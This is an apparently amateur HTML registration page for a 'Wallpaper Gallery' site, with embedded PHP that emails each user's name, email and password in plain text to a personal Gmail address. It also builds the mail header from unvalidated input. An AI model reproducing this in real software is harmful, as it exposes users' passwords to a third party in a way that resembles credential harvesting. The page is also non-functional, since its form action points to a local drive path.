<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000; /* Black background */
            color: #fff; /* White text for readability */
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column; /* Allow for footer with column layout */
            min-height: 100vh; /* Make sure the body takes the full height */
            overflow-y: auto; /* Enable vertical scrolling */
        }
        .form-container {
            background-color: #222; /* Dark gray background for the form */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); /* Red shadow effect */
            max-width: 400px;
            width: 100%;
            margin: 20px auto; /* Center and add space on top/bottom */
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #ff0000; /* Red color for the heading */
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #ff0000; /* Red color for labels */
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ff0000; /* Red border for input fields */
            border-radius: 4px;
            box-sizing: border-box;
            background-color: #333; /* Darker background for inputs */
            color: #fff; /* White text for inputs */
        }
        input[type="submit"] {
            background-color: #ff0000; /* Red background for the button */
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #cc0000; /* Darker red on hover */
        }
        footer {
            color: #ff0000; /* Red text for the footer */
            text-align: center; /* Centered text */
            padding: 10px 0; /* Padding for the footer */
        }
    </style>
</head>
<body>

    <div class="form-container">
        <h2>Register</h2>
        <form action="j:\c.s\wallpapers web.html" method="post"> <!-- Change this URL to your desired site -->
            <label for="name">Name</label>
            <input type="text" id="name" name="name" placeholder="Enter your name" required>

            <label for="email">Email</label>
            <input type="email" id="email" name="email" placeholder="Enter your email" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>

            <input type="submit" value="Submit">
        </form>
    </div>

    <footer>
        © 2024 Wallpaper Gallery. All rights reserved.
    </footer>

    <?php
    // PHP code to handle form submission
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $name = htmlspecialchars($_POST['name']);
        $email = htmlspecialchars($_POST['email']);
        $password = htmlspecialchars($_POST['password']); // Be cautious with passwords

        $to = "safatshayor333@gmail.com";
        $subject = "New Registration";
        $message = "Name: $name\nEmail: $email\nPassword: $password"; // Avoid sending passwords in plain text.

        $headers = "From: $email";

        // Attempt to send the email
        if(mail($to, $subject, $message, $headers)) {
            echo "<script>alert('Message sent successfully!');</script>";
        } else {
            echo "<script>alert('Failed to send message.');</script>";
        }
    }
    ?>

</body>
</html>